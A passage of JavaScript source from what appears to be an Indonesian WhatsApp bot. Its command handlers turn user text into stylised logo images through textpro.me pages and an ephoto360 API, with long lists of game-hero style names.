             if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'
             if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/karbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
             if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await maker.textpro(link, q)
             tganz.sendMessage(m.chat, { image: { url: anu }, caption: mess.done }, { quoted: m })
             }
             break
            case "shirtclub":
            case 'steellettering':
            case 'letterstext':
            case 'barcashirt':
            case 'premiercup':
            case 'stylepoligon':
            case 'lifebuoys':
            case 'juventusshirt': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Tᴇᴋs ᴋᴇ 1|Tᴇᴋs ᴋᴇ 2\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} Tᴇsᴛ|Gᴀɴᴢ`)
                mm = args.join(' ')
                m1 = mm.split("|")[0];
                m2 = mm.split("|")[1];
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/ephoto360/' + command, {
                    text: m1,
                    text2: m2
                }, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                tganz.sendFile(m.chat, img, 'ephoto.jpg', mess.done, m)
            }
            break

            //logo maker
            case 'coverbannerlol': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|pyke-7`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|pyke-7`)
                var arg = args.join(' ')
                atas = arg.split('|')[0]
                bawah = arg.split('|')[1]
                const style = ['jinx7', 'jinx-8', 'kassadin-5', 'nissfortune-5', 'pyke-7', 'riven-8', 'sylas-5', 'vayne-9', 'kassadin-4', 'qiyana-5', 'renataglasc', 'shen-5', 'heimerdinger-3', 'nunu-5', 'orianna-4', 'ziggs-4', 'soraka-9', 'soraka-10', 'xayah-3', 'zeri-2', 'ahri-9', 'akshan-2', 'amumu-4', 'annie-3', 'bard-3', 'brand-5', 'diana-4', 'draven-3', 'ekko-6', 'elise-4', 'ezreal-7', 'gwen-3', 'janna-6', 'kindred-3', 'leblanc-7', 'leona-7', 'lissandra-4', 'lux-8', 'lux-9', 'nalzahar-4', 'nasteryi-7', 'reksai-3', 'sett-3', 'sivir-6', 'teemo-5', 'tristana-6', 'vladimir-5', 'xinzhao-5', 'zed-7', 'zeri', 'caitlyn-6', 'caitlyn-7', 'caitlyn-8', 'caitlyn-9', 'caitlyn-10', 'caitlyn-11', 'jayce-5', 'kaisa-8', 'karma-7', 'thresh-6', 'vi-5', 'yasuo-8', 'yasuo-9', 'fiora-8', 'norgana-7', 'nami-5', 'poppy-4', 'syndra-5', 'yuumi-4', 'jarvaniv-6', 'kayn-4', 'kayle-5', 'lillia-2', 'norgana-6', 'tryndamere-3', 'vex', 'vex-2', 'yone-4', 'tristana-5', 'viego-2', 'akali-10', 'anivia-4', 'darius-5', 'graves-6', 'seraphine-5', 'shaco-2', 'twistedfate-4', 'xayah-2', 'zyra-5', 'ahri-8', 'ashe-6', 'cassiopeia-4', 'evelynn-6', 'leblanc-6', 'nalphite-4', 'warwick-5', 'akshan', 'graves-5', 'nissfortune-5', 'pyke-6', 'rengar-6', 'thresh-5', 'diana-3', 'relia-11', 'olaf-3', 'pantheon-6', 'pantheon-7', 'riven-7', 'vayne-8', 'corki-4', 'naokai-2', 'rammus-4', 'veigar-4', 'zed-6', 'camille-4', 'drmundo-3', 'lucian-6', 'nordekaiser-4', 'renekton-4', 'sejuani-5', 'senna-3', 'sylas-4', 'varus-5', 'xerath-3', 'damwon', 'galio-3', 'gwen', 'gwen-2', 'jax-5', 'jinx-6', 'kayle-5', 'sion-2', 'twitch-4', 'velkoz-4', 'blitzcrank-3', 'leona-6', 'lulu-3', 'lulu-4', 'lux-7', 'nasus-5', 'nunu-4', 'rumble-2', 'samira-3', 'aphelios-2', 'blitzcrank-2', 'caitlyn-5', 'garen-6', 'kogmaw-4', 'leona-5', 'alzahar-3', 'syndra-4', 'wukong-4', 'yone-3', 'yuumi-3', 'zyra-4', 'alistar-4', 'chogath-2', 'draven-2', 'fiora-7', 'jarvan-5', 'jhin-5', 'karma-6', 'nautilus-2', 'neeko-5', 'shyvana-3', 'viego', 'azir-4', 'diana-4', 'gragas-2', 'janna-5', 'kalista-3', 'katarina-6', 'ornn-2', 'qiyana-4', 'quinn-3', 'rell', 'xinzhao-4', 'anivia-3', 'hecarim-4', 'illaoi-2', 'jayce-4', 'lissandra-3', 'nami-4', 'nasus-4', 'nidalee-5', 'seraphine-4', 'singed-2', 'skarner-2', 'soraka-7', 'varus-4', 'vladimir-4', 'yorick-4', 'zac', 'riven-8', 'ahri-7', 'akali-9', 'evelynn-5', 'kaisa-7', 'lucian-5', 'seraphine', 'seraphine-2', 'seraphine-3', 'aatrox-6', 'amumu-3', 'lise-3', 'fizz-5', 'karma-5', 'zeri-2', 'kassadin-3', 'khazix-4', 'sivir-5', 'twistedfate-3', 'ashe-5', 'brand-4', 'leesin-5', 'olaf-2', 'sett-2', 'kayle-4', 'leblanc-5', 'pyke-5', 'samira', 'samira-2', 'viktor-2', 'yasuo-7', 'zed-5', 'ezreal-6', 'nasteryi-6', 'shen-4', 'sona-4', 'vi-4', 'yone', 'yone-2', 'ziggs-3', 'ahri-6', 'cassiopeia-3', 'kindred-2', 'riven-6', 'kennen-2', 'kogmaw-3', 'lillia', 'syndra-3', 'teemo-4', 'thresh-4', 'vayne-7', 'velkoz-3', 'yasuo-6', 'zoe-4', 'bard-2', 'gnar-3', 'irelia-10', 'nocturne-4', 'poppy-3', 'enna-2', 'volibear-3', 'volibear-4', 'ekko-5', 'fiora-6', 'lucian-4', 'pantheon-5', 'leblanc-4', 'norgana-5', 'urgot-4', 'zyra-3', 'jinx-5', 'sett', 'alistar-3', 'katarina-5', 'lux-5', 'lux-6', 'nasteryi-5', 'nalphite-3', 'nordekaiser-3', 'reksai-2', 'sejuani-4', 'tryndamere-2', 'xerath-2', 'aphelios', 'garen-5', 'jax-4', 'karma-4', 'leesin-4', 'leona-4', 'nidalee-4', 'rengar-5', 'soraka-5', 'soraka-6', 'swain-4', 'sylas-3', 'trundle-2', 'vladimir-3', 'aatrox-5', 'akali-8', 'ekko-4', 'qiyana-3', 'senna', 'yasuo-5', 'ashe-4', 'darius-4', 'hecarim-3', 'norgana-4', 'nami-3', 'riven-4', 'riven-5', 'ryze-3', 'neeko-3', 'eeko-4', 'xayahrakan', 'zoe-3', 'airi-6', 'noctune-3', 'pantheon-3', 'pantheon-4', 'rammus-3', 'udyr-2', 'veigar-3', 'akali-7', 'garen-4', 'irelia-8', 'irelia-9', 'jinx-4', 'lucian-3', 'pyke-4', 'warwick-4', 'caitlyn-3', 'caitlyn-4', 'kaisa-6', 'qiyana', 'qiyana-2', 'yasuo-4', 'jhin-3', 'karma-3', 'nordekaiser-2', 'tristana-4', 'nami', 'poppy-3', 'aatrox', 'lulu', 'braum', 'camille', 'karma', 'kindred', 'hecarim', 'norgana', 'renekton', 'kennen', 'akali', 'varus', 'orianna', 'blitzcrank', 'bloodmoonjhin', 'bloodmoontalon', 'arcaderiven', 'udyr', 'rumble', 'gnar', 'shaco', 'twitch', 'veigar', 'tryndamere', 'viktor', 'trundle', 'ezreal', 'poppy', 'lissandra', 'jax', 'vi', 'vellkoz', 'darius', 'diana', 'corki', 'sivir', 'ryze', 'azir', 'tristana', 'kled', 'volibear', 'twisterfate', 'anivia', 'zyra', 'quinn', 'nissfortune', 'kalista', 'ezrealandshen', 'gangplank', 'hextachannie', 'elementalistlux', 'xinzhao', 'vayne', 'jhin', 'reksai', 'graves', 'kogmaw', 'garen', 'porojinx', 'warwick', 'fizz', 'caitlyn', 'rengar', 'talon', 'nidalee', 'lux', 'jinx', 'thresh', 'wukong', 'sona', 'ahri', 'riven', 'zed', 'leesin', 'janna', 'katarina', 'leblanc', 'leona', 'fiora', 'lucian', 'shen', 'ziggs', 'yasuo', 'ekko', 'draven', 'ashe', 'ekko-5', 'teemo', 'khazix', 'nasteryi', 'brand', 'taliyah', 'nocturne', 'cassiopeia', 'xayah', 'rakan', 'syndra', 'irelia', 'leesingf', 'yasuobm', 'aurelionsol', 'pantheon', 'bard', 'singed', 'soraka', 'taric', 'naokai', 'xerath', 'gragas', 'jayce', 'riven3', 'nalphite', 'naster_yi2', 'chogath', 'zed2', 'darius2', 'talon2', 'kayle', 'drmundo', 'rammus', 'vladimir', 'ahri-2', 'karma-2', 'jarvan', 'nidalee-2', 'vayner-2', 'warwick-2', 'rengar-2', 'yasuo-3', 'galio', 'pantheon-2', 'jinx-2', 'nalzahar', 'olaf', 'shyvana', 'thresh-2', 'sion', 'caitlyn-2', 'swain', 'kassadin', 'heimerdinger', 'amumu', 'alistar', 'nasus', 'sejuani', 'ezreal3', 'nautilus', 'fiddlesticks', 'sona2', 'karthus', 'ekko2', 'orianna2', 'velkoz-2', 'xinzhao2', 'garen2', 'annie-2', 'yasuonb', 'rivendb', 'kayn', 'kaisa', 'veigar-2', 'vayne-3', 'twitch-2', 'tristana-2', 'rhaast', 'nalzahar-2', 'kayle-2', 'illaoi', 'fizz-2', 'elise', 'brand-2', 'syndra-2', 'soraka-2', 'nissfortune-2', 'hecarim-2', 'ezreal-2', 'ahri-3', 'yorick', 'z-2', 'tahmkench', 'shen-2', 'ornn', 'cassiopeia-2', 'renekton-2', 'nasus-2', 'jarvan-2', 'fiora-2', 'alistar-2', 'taric-2', 'zac-2', 'yorick-2', 'varus-2', 'nordekaiser', 'nasteryi-3', 'katarina-2', 'janna-2', 'fiora-3', 'evelynn', 'elise-2', 'ashe-2', 'annie', 'zoe', 'vi-2', 'vayne-4', 'rengar-3', 'jhin-2', 'graves-2', 'xayahrakan', 'warwick-3', 'nissfortune-3', 'lux-2', 'kaisa', 'jarvaniv', 'zoe-2', 'swain-2', 'sivir-2', 'nissfortune-4', 'jax-2', 'galio-2', 'varus-3', 'urgot', 'twistedfate-2', 'taric-3', 'swain-3', 'shen-3', 'rammus-2', 'pyke-2', 'pyke', 'nasus-3', 'talon', 'khazix-2', 'kayn-2', 'irelia-2', 'evelynn-2', 'akali-2', 'vladimir-2', 'jayce-2', 'janna-3', 'irelia-4', 'irelia-3', 'diana-2', 'zed-3', 'teemo-2', 'taliyah-2', 'shyvana-2', 'poppy-2', 'katarina-3', 'jax-3', 'garen-3', 'darius-3', 'chogath-2', 'aatrox-2', 'soraka-3', 'sona-3', 'sivir-3', 'kaisa-2', 'akali-4', 'akali-3', 'xinzhao-3', 'urgot-3', 'urgot-2', 'tristana-3', 'talon-3', 'sejuani-2', 'nunu-2', 'lulu-2', 'lucian-2', 'irelia-6', 'irelia-5', 'ashe-3', 'ziggs-2', 'yasuo-2', 'sona-4', 'nalphite-2', 'khazix-3', 'kayn-3', 'jinx-3', 'orianna-3', 'kaisa-4', 'kaisa-3', 'heimerdinger-2', 'ezreal-4', 'evelynn-3', 'akali-5', 'ahri-4', 'thresh-3', 'ryze-2', 'kled-2', 'janna-4', 'graves-3', 'fiddlesticks-2', 'ekko-3', 'amumu-2', 'nami-2', 'lulusoraka', 'lissandra-2', 'leona-3', 'leona-2', 'leblanc-2', 'ezrealmissfortune', 'camille-2', 'twitch-3', 'soraka-4', 'renekton-3', 'neeko-2', 'neeko', 'nasteryi-4', 'drmundo-2', 'akali-6', 'zyra-2', 'zilean', 'wukong-3', 'wukong-2', 'teemo-3', 'skarner', 'sivir-4', 'riven-2', 'quinn-2', 'pyke-3', 'nocturne-2', 'nidalee-3', 'norgana-2', 'leesin-3', 'kogmaw-2', 'kassadin-2', 'karthus-2', 'kalista-2', 'gnar-2', 'gangplank-2', 'corki-2', 'azir-3', 'azir-2', 'aatrox-4', 'aatrox-3', 'vi-3', 'vayne-6', 'vayne-5', 'tahmkench-2', 'sylas-2', 'sylas', 'sejuani-3', 'fiora-4', 'nunu-3', 'norgana-3', 'kayle-3', 'brand-3', 'anivia-2', 'ahri-5', 'yorick-3', 'rengar-4', 'fizz-4', 'fizz-3', 'corki-3', 'zed-4', 'rakan-2', 'leblanc-3', 'kaisa-5', 'jarvaniv', 'ivern', 'irelia-7', 'fiora-5', 'evelynn-4', 'camille-3', 'yuumi-2', 'yuumi', 'lux-4', 'lux-3', 'katarina-4', 'jayce-3', 'graves-4', 'ezreal-5']
                if (!style.includes(bawah)) {
                    getStyle(style.length, "heroes")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: atas,
                        heroes: bawah
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'pubglogomaker': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|women`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|women`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['women', 'nen']
                if (!style.includes(bawah)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'colorfulpubg': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|color\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|green-yellow`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|color\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|green-yellow`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['gold', 'green-blue', 'pink-yellow', 'green-yellow', 'cyan-purple', 'orange-red']
                if (!style.includes(m2)) {
                    getStyle(style.length, "color")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        color: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'astronotspace': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|panther`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|panther`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['anubis', 'dragon', 'duck', 'gorilla', 'panda', 'panther', 'shark', 'squirrel', 'tiger', 'wolf', 'bull', 'rhino', 'rooster', 'pikachu', 'parrot', 'boar', 'bee', 'hurricane', 'deer', 'horse', 'crocodile', 'pitbull']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'wallpaperaov': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|preyta-2`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|heroes\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|preyta-2`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['allain', 'allain-2', 'kahlii-3', 'nakroth-4', 'preyta-2', 'skud-2', 'taara-4', 'valhein-4', 'arum-4', 'butterfly-6', 'capheny-3', 'elandorr-2', 'ilumia-3', 'ishar-4', 'lauriel-6', 'laville', 'liliana-5', 'nurad-8', 'quillen-5', 'rouie', 'rouie-2', 'taara-3', 'telannas-5', 'yena-4', 'yena-5', 'zata', 'ata', 'lauriel-5', 'qi-3', 'roxie-3', 'wukong-5', 'aleister-2', 'amily-3', 'arthur-3', 'arum-3', 'astrid-2', 'dirak', 'dirak-2', 'grakk-5', 'hayate-4', 'ishar-2', 'ishar-3', 'jinna-2', 'keera', 'keera-3', 'lauriel-4', 'nax', 'natalya-5', 'quillen-4', 'raz-3', 'richter-2', 'ryoma-4', 'telannas-4', 'ulen-6', 'valhein-3', 'violet-7', 'yorn-4', 'zill-3', 'ignis-2', 'lubu-2', 'naloch-2', 'sephera-3', 'butterfly-5', 'diaochan-4', 'elandoor', 'krizzix-2', 'nina-2', 'natalya-3', 'veera-3', 'violet-6', 'yena-2', 'yena-3', 'krizziz', 'nurad-7', 'volkath', 'volkath-2', 'airi-4', 'arduin-3', 'enzo-3', 'hayate-3', 'krixi-3', 'nurad-6', 'quillen-3', 'telannas-3', 'wisp-2', 'zip-2', 'gildur-2', 'ishar', 'tulen-5', 'amily-2', 'annette-3', 'arthur-2', 'butterfly-4', 'errol-2', 'joker', 'kahlii-2', 'kilgroth', 'lauriel-3', 'nurad-5', 'arduin-2', 'darcy-2', 'florentino-3', 'noren', 'quillen-2', 'ryoma-5', 'sephera-3', 'violet-5', 'airi-3', 'diaochan-3', 'diaochanlubu', 'elsuroxie', 'lindis-3', 'taara-2', 'toro-2', 'tulen-4', 'violet-4', 'wonderwoman', 'ybneth', 'zill-2', 'arum-2', 'florentino-2', 'liliana-4', 'nurad-4', 'yorn-3', 'zip', 'annette-2', 'qi', 'qi-2', 'celica', 'capheny-2', 'diaochan-2', 'elsu-2', 'ilumia-2', 'krixi-2', 'narja-2', 'nurad-3', 'preyta', 'telannas-2', 'valhein', 'veera-2', 'veres-2', 'yorn-2', 'zephys-2', 'airi-2', 'annette', 'baldum', 'butterfly-3', 'elsu-2', 'errol', 'fennik', 'lauriel-2', 'liliana-2', 'liliana-3', 'lindis-2', 'nurad-2', 'nakroth-2', 'nakroth-3', 'natalya-2', 'raz-2', 'ryoma-2', 'slimz', 'teemee', 'tulen-2', 'tulen-3', 'violet-3', 'wiro', 'wukong-3', 'wukong-4', 'zill', 'aleister', 'alice', 'arduin', 'arthur', 'azzenka', 'batman', 'butterfly-2', 'cresh', 'darcy', 'diaochan', 'enzo-2', 'hayate-2', 'jinna', 'lubu', 'nganga', 'violet-2', 'wukong-2', 'zanis-2', 'florentino', 'gildur', 'ignis', 'naloch', 'narja', 'nakroth', 'omen', 'payna', 'raz', 'rourke', 'roxie', 'ryoma', 'skud', 'taara', 'toro', 'valhein', 'veres', 'violet', 'wisp', 'wukong', 'wonderwoman', 'xeniel', 'yorn', 'zanis', 'elsu', 'flash', 'hayate', 'ilumia', 'kahlii', 'krixi', 'lauriel', 'liliana', 'lindis', 'nina', 'nurad', 'natalya', 'quillen', 'richter', 'sephera', 'superman', 'telannas', 'thane', 'airi', 'amily', 'arum', 'astrid', 'butterfly', 'capheny', 'enzo', 'tulen', 'veera', 'yena', 'ryoma-4', 'zephys', 'zuka']
                if (!style.includes(m2)) {
                    getStyle(style.length, "heroes")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        heroes: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'maketeamlogo': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|panda`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|style\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|panda`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['anubis', 'cowgirl', 'dragon', 'duck', 'ghost', 'gorilla', 'panda', 'panther', 'shark', 'squirrel', 'tiger', 'wolf', 'bee', 'crocodile', 'deer', 'pitbull', 'horse', 'hurricane', 'indian', 'assassin', 'boar', 'rapid', 'raven', 'warrior', 'pikachu', 'pubg', 'ninja', 'drift', 'yasuo', 'rhino', 'phoenix', 'bull', 'hornet', 'eagle', 'hunter', 'parrot', 'rooster', 'lion', 'skull', 'wolver', 'wolf', 'cobra', 'dragon', 'panther', 'owl', 'tiger', 'reaper', 'warrior']
                if (!style.includes(m2)) {
                    getStyle(style.length, "style")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        style: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'circlemarcotteam': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|bear`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|logo\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|bear`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['panther', 'rhino', 'squirrel', 'unicorn', 'zebra', 'lionsnake', 'bear', 'bull', 'dragon', 'eagle', 'fox', 'griffin', 'hawk', 'lion', 'peacock', 'phoenix', 'tiger', 'wolver']
                if (!style.includes(m2)) {
                    getStyle(style.length, "logo")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        logo: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
               }
